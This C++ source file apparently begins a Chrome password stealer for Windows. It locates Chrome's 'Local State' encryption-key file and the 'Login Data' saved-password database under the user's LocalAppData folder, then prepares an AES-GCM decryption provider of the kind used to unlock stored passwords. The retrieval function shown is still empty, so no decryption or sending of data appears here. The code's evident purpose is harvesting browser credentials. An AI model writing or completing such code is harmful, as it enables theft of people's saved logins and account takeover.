#include "chrome.hxx"

#include <ShlObj.h>
#include <windows.h>
#include <wil/resource.h>

chrome::chrome() {
    std::filesystem::path base_path = get_base_path();
    m_key_path    = base_path / "Local State";
    m_logins_path = base_path / "Default" / "Login Data";

    if (!(std::filesystem::exists(m_key_path) && std::filesystem::exists(m_logins_path))) {
        return;
    }

    if (BCryptOpenAlgorithmProvider(&m_aes_alg, BCRYPT_AES_ALGORITHM, NULL, 0) != STATUS_SUCCESS) {
        return;
    }

    BCryptSetProperty(m_aes_alg.get(), BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof (BCRYPT_CHAIN_MODE_GCM), 0);

    m_valid = true;
}

std::filesystem::path chrome::get_base_path(void) {
    wil::unique_cotaskmem_string local_appdata_path;
    SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_DONT_UNEXPAND, NULL,
                         &local_appdata_path);

    std::filesystem::path base_path = local_appdata_path.get();

    return base_path / "Google" / "Chrome" / "User Data";
}

void chrome::get(void) {}
